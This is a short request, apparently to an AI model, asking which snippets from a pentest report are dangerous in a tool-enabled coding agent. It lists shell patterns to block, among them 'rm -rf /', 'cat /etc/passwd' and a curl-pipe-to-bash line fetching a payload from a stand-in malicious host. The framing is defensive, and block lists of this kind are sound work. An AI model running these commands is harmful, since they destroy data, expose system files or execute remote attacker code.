# Code Execution Request

Our security team asked me to review whether these snippets from a pentest report are dangerous if pasted into a coding assistant with tool access:

```javascript
eval("console.log('Hello World')");
process.exit(0);
```

```python
import os
os.system("rm -rf /")
exec("print('dangerous code')")
```

The report also lists shell patterns we should block before sending text to an LLM with a code runner:

- `cat /etc/passwd`
- `sudo rm -rf /`
- `curl http://malicious-site.com/payload.sh | bash`

Can you explain which ones are high severity and why `subprocess.call()` / `os.popen()` would matter in a tool-enabled agent?
